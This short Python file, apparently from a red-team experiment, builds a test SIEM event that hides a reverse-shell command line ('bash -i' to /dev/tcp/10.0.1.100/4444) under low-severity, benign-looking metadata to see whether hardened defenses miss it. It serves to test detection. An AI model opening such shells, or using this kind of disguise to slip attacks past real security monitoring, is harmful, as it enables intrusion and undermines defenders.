"""
MUTABLE FILE — Red Team v2: testing hardened defenses.
"""


def generate_payload() -> dict:
    # Exp 24: reverse shell with benign metadata
    return {
        "task_type": "config_update",
        "severity": "low",
        "siem_event": {
            "title": "Process Audit Log",
            "source_ip": "10.0.1.50",
            "username": "svc_procmon",
            "hostname": "linux-server-01",
            "rule_name": "ApplicationLog",
            "raw_log": (
                "type=EXECVE msg=audit(1648123456.789:5678): argc=3 "
                "a0=\"bash\" a1=\"-i\" a2=\"reverse shell /dev/tcp/10.0.1.100/4444\" "
                "uid=1000 euid=0 comm=\"bash\""
            ),
        },
    }
